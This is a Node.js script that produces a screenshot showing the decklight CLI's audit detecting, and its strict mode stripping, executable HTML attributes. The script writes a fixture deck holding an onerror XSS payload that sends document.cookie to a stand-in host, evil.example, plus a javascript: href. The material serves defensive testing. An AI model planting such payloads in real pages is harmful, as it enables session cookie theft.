#!/usr/bin/env node
// Copyright 2026 Gilles Philippart
// SPDX-License-Identifier: Apache-2.0

// Evidence for PRESENT#AUDIT / PRESENT#STRICT covering executable ATTRIBUTES.
// The attack the shot demonstrates is the one the ticket names: an appended
// `<img src=x onerror=…>` adds no <script> block, so the old label printed
// "0 unaccounted script blocks" and exited 0 while the handler ran in front
// of the audience.
//
// Nothing about this feature is a browser pixel — the surfaces are the printed
// label and the served bytes — so, like present-remote-transcript.mjs, the shot
// is the CLI surface itself: a REAL `decklight present --check` naming the
// handler and the javascript: href and exiting 1, then a REAL `decklight
// present` serving strict, with curl showing the attribute gone from the bytes
// on the wire while the file on disk keeps it.
//
//   node shots/audit-handlers-transcript.mjs    → .shots/audit-handlers.png

import { execFileSync, spawn, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const here = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(here, '..');
const CLI = path.join(root, 'cli', 'decklight.mjs');

// --- fixture: a clean deck, then the forwarded copy with the payload ----------

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'decklight-audit-shot-'));
fs.writeFileSync(path.join(dir, 'talk.html'), `<!doctype html>
<html><body>
  <div class="decklight">
    <section><h2>Quarterly results</h2></section>
  </div>
  <script>var Decklight = { init(){} }</script>
  <script>Decklight.init()</script>
  <img src=x onerror="fetch('//evil.example/'+document.cookie)">
  <a href="javascript:alert(document.cookie)">view the appendix</a>
</body></html>
`);

// --- the label, as CI would see it ---------------------------------------------

const check = spawnSync(process.execPath, [CLI, 'present', '--check', 'talk.html'],
  { cwd: dir, encoding: 'utf8' });
const checkOut = (check.stdout + check.stderr).trimEnd()
  + `\n(exit ${check.status})`;

// --- the server, and what actually goes over the wire --------------------------

const dev = spawn(process.execPath, [CLI, 'present', 'talk.html'],
  { cwd: dir, stdio: ['ignore', 'pipe', 'pipe'] });
let out = '';
dev.stdout.on('data', (c) => { out += c; });
dev.stderr.on('data', (c) => { out += c; });

const until = async (re, ms = 10000) => {
  const t0 = Date.now();
  while (!re.test(out)) {
    if (Date.now() - t0 > ms) { dev.kill(); console.error('timed out waiting for:', re, '\n' + out); process.exit(1); }
    await new Promise((r) => setTimeout(r, 50));
  }
  return out.match(re);
};

const [, port] = await until(/http:\/\/127\.0\.0\.1:(\d+)/);
await until(/serving strict/);
await new Promise((r) => setTimeout(r, 200));

const served = spawnSync('curl', ['-s', '--max-time', '5', `http://127.0.0.1:${port}/talk.html`],
  { encoding: 'utf8' }).stdout;
const grep = (s, re) => s.split('\n').filter((l) => re.test(l)).map((l) => l.trim()).join('\n');
const wire = grep(served, /<img|<a href|appendix/);
const disk = grep(fs.readFileSync(path.join(dir, 'talk.html'), 'utf8'), /<img|<a href/);

dev.kill('SIGINT');
await new Promise((r) => dev.on('exit', r));
fs.rmSync(dir, { recursive: true, force: true });

// --- render the transcript as a terminal window and shoot it -------------------

const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;');
const paintLabel = (s) => esc(s)
  .replace(/^(\s*\d+ executable attributes? — .*)$/gm, '<span class="bad">$1</span>')
  .replace(/^(\s*line\s+\d+\s+&lt;(?:img|a)&gt;.*)$/gm, '<span class="bad">$1</span>')
  .replace(/^(\s*0 unaccounted script blocks)$/gm, '<span class="hint">$1</span>')
  .replace(/^(\(exit 1\))$/gm, '<span class="bad">$1</span>')
  .replace(/^(\s*.*executable attributes? stripped — serving strict.*)$/gm, '<span class="ok">$1</span>')
  .replace(/^(\s*ingredients — .*)$/gm, '<span class="tag">$1</span>');
const block = (cmd, body) => `<div class="run"><span class="prompt">~/inbox $</span> ${esc(cmd)}\n${body}</div>`;

const html = `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>ingredients label — executable attributes</title><style>
  body { margin: 0; display: grid; place-items: center; height: 100vh;
         background: linear-gradient(135deg, #1b2735, #090a0f); }
  .term { width: 1150px; background: #10141b; border-radius: 12px;
          box-shadow: 0 24px 70px rgba(0,0,0,.55); overflow: hidden;
          font: 15px/1.5 ui-monospace, SFMono-Regular, Menlo, monospace; }
  .bar { display: flex; align-items: center; gap: 8px; padding: 11px 14px; background: #1a202b; }
  .bar i { width: 12px; height: 12px; border-radius: 50%; }
  .bar .t { margin-left: 10px; color: #8b98ab; font-size: 13px; }
  .body { padding: 16px 22px 22px; color: #cdd6e4; white-space: pre-wrap; }
  .run + .run { display: block; margin-top: 1.1em; }
  .prompt { color: #67e8f9; font-weight: 700; }
  .tag { color: #22d3ee; font-weight: 700; }
  .ok { color: #86efac; }
  .bad { color: #fca5a5; font-weight: 700; }
  .hint { color: #fbbf24; }
</style></head><body>
<div class="term">
  <div class="bar"><i style="background:#ff5f57"></i><i style="background:#febc2e"></i><i style="background:#28c840"></i>
    <span class="t">the ingredients label names executable attributes — and strict mode strips them on the way out</span></div>
  <div class="body">${block('decklight present --check talk.html        # a forwarded deck: no <script> added, just an onerror= and a javascript: href', paintLabel(checkOut))}
${block('decklight present talk.html                # presenting it: strict turns itself on', paintLabel(out.trimEnd()))}
${block(`curl -s http://127.0.0.1:${port}/talk.html | grep -E '<img|<a'      # the bytes on the wire — attributes gone`, `<span class="ok">${esc(wire)}</span>`)}
${block(`grep -E '<img|<a' talk.html                # the file on disk — untouched`, `<span class="hint">${esc(disk)}</span>`)}</div>
</div>
</body></html>
`;

const page = path.join(root, '.shots', 'audit-handlers-transcript.html');
fs.mkdirSync(path.dirname(page), { recursive: true });
fs.writeFileSync(page, html);
execFileSync('node', [path.join(root, 'tools', 'shot.mjs'), page,
  '-o', path.join(root, '.shots', 'audit-handlers.png'), '--size', '1280x960', '--wait', '800'],
  { stdio: 'inherit' });
fs.rmSync(page, { force: true });
